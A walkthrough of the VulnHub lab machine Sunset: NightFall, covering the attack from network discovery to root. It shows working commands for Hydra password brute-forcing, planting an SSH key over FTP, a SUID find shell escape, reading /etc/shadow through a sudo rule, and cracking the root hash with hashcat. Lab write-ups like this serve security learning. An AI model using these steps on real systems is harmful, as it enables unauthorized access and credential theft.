# Sunset: NightFall — Machine Walkthrough

> A step-by-step walkthrough of the **Sunset: NightFall** VulnHub machine — from initial setup to root.

---

##  Downloading & Setting Up the Machine on a VM

Start by downloading the **Sunset: NightFall** machine from [VulnHub.com](https://www.vulnhub.com/).

After downloading and extracting the files:

1. Open **VMware**.
2. From the **File** menu, choose **Open**.
3. Select the file with the **`.ovf`** extension.

### Fixing the Network (NAT) Issue

In my case, NightFall wouldn't take an IP on the NAT network. Here's the fix:

1. Launch the machine, and on the **GRUB** screen, hold or press **`Esc`** a few times.
2. Press **`e`** to edit the boot commands and find the `linux` line.
3. At the end of that line, change `ro` to:
   ```
   rw init=/bin/bash
   ```
4. Press **`F10`** to boot.

You'll land in a root shell: `root@(none):/#`. Run:

```bash
ip a
```

to list the available interfaces.

If `ens33` shows as **down**, bring it up and grab an IP:

```bash
ip link set ens33 up
dhclient ens33
exec /sbin/init
```

>  This is a **temporary fix**. For a permanent one, check `/etc/network/interfaces`.

---

## IP Sweeping & Port Scanning

Open a Kali terminal:

```bash
ifconfig
```

→ Kali IP: **`192.168.159.128`**

Sweep the network:

```bash
sudo netdiscover -r 192.168.159.128/24
```

→ NightFall IP: **`192.168.159.132`**

Scan open ports and services:

```bash
nmap -sT -sV -sC -A -p- 192.168.159.132
```

**Simplified results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp  | ftp           | pyftpdlib 1.5.5 |
| 22/tcp  | ssh           | OpenSSH 7.9p1 Debian 10 |
| 80/tcp  | http          | Apache httpd 2.4.38 (Debian) |
| 139/tcp | netbios-ssn   | Samba smbd 3.X - 4.X (WORKGROUP) |
| 445/tcp | netbios-ssn   | Samba smbd 4.9.5-Debian (WORKGROUP) |
| 3306/tcp| mysql         | MariaDB 5.5.5-10.3.15 |

OS fingerprint: **Linux 3.2 – 4.14**

---

##  Enumeration

Six open ports: `ftp (21)`, `ssh (22)`, `http (80)`, `netbios-ssn (139)`, `netbios-ssn (445)`, `mysql (3306)`.

- Tried **anonymous FTP login** → failed.
- Moved to **Samba enumeration**:

```bash
enum4linux 192.168.159.132
```

This revealed local users via SID `S-1-22-1`:

```
S-1-22-1-1000  Unix User\nightfall
S-1-22-1-1001  Unix User\matt
```

Two local users found: **`matt`** and **`nightfall`**.

### Brute-Forcing Credentials

With no hashes available, I brute-forced FTP/SSH with Hydra:

```bash
hydra -u matt -P /usr/share/wordlists/rockyou.txt ftp://192.168.159.132
```

**Credentials found:** `matt : cheese`

---

## Getting an SSH Shell

Logging in to FTP with `matt`'s password gives file access, but not a real shell — so we plant an SSH key.

**Steps:**

1. Log in via FTP as `matt`, create a `.ssh` directory, then exit.
2. Locally, generate a key pair:
   ```bash
   ssh-keygen -f id_rsa
   ```
3. Log back into FTP, upload `id_rsa.pub`, and **rename it to `authorized_keys`** (SSH requires this exact filename).
4. Connect via SSH using the private key:
   ```bash
   ssh -i id_rsa matt@192.168.159.132
   ```

---

##  Privilege Escalation — `matt` → `nightfall`

Search for SUID binaries:

```bash
find / -type f -perm -4000 2>/dev/null
```

A custom SUID binary was found: **`/scripts/find`**. Checking [GTFOBins](https://gtfobins.github.io/) for `find` gives:

```bash
/scripts/find . -exec /bin/sh -p \; -quit
```

This drops a privileged shell as **`nightfall`**.

**FLAG 1** — found in `user.txt`:
```
97fb7140ca325ed96f67be3c9e30083d
```

### Pivoting to a Real `nightfall` Shell

Since we can write to `nightfall`'s home directory, we repeat the SSH-key trick:

1. Create `.ssh/authorized_keys` under `nightfall`'s home.
2. Paste in the public key (`id_rsa.pub`).
3. SSH in directly as `nightfall`:
   ```bash
   ssh -i id_rsa nightfall@192.168.159.132
   ```

Checking sudo rights:

```bash
sudo -l
```

Result — `nightfall` can run `/usr/bin/cat` as **root**, with no password:

```
User nightfall may run the following commands on nightfall:
    (root) NOPASSWD: /usr/bin/cat
```

---

##  Privilege Escalation — `nightfall` → `root`

Using the `cat` sudo rule to read `/etc/shadow`:

```bash
sudo cat /etc/shadow
```

Root's hash:
```
$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.
```

### Identifying & Cracking the Hash

```bash
hashcat --identify '<hash>'
```

→ Identified as **sha512crypt ($6$) / SHA-512 (Unix)**, hashcat mode `1800`.

```bash
hashcat -m 1800 '<hash>' /usr/share/wordlists/rockyou.txt
```

**Cracked!** Root password: **`miguel2`**

---

##  Exploitation — Full Root

```bash
su root
```

Enter the cracked password → **root access confirmed**.

Navigate to `/root`, read `root_super_secret_flag.txt`:

```
Thank you for playing! - Felipe Winsnes (whitecr0wz)
flag{9a5b21fc6719fe33004d66b703d70a39}
```

**Machine fully rooted.**

---

## Bonus: Why Does the SSH-Key Trick Work?

This is simply how OpenSSH works on any Linux/Unix system. When the server receives a login attempt using **public key authentication**, `sshd` automatically checks a fixed path:

```
/home/<username>/.ssh/authorized_keys
```

So logging in as `matt` makes `sshd` check exactly:

```
/home/matt/.ssh/authorized_keys
```

If the file isn't at that **exact path** with that **exact filename**, SSH simply won't find it — and won't look anywhere else. That's why the trick of uploading `id_rsa.pub` and renaming it to `authorized_keys` works on any writable home directory.

---

##  Summary

| Stage | Technique |
|-------|-----------|
| Recon | `nmap`, `netdiscover` |
| Enumeration | `enum4linux` → found users `matt`, `nightfall` |
| Initial Access | Hydra brute-force on FTP |
| Foothold | SSH key planted via FTP write access |
| Priv Esc #1 | SUID `find` binary → GTFOBins |
| Priv Esc #2 | `sudo` misconfiguration on `cat` → read `/etc/shadow` |
| Root | Cracked root hash with `hashcat` |

---

*Made by: **Fares Mohamed Abd Elaty***
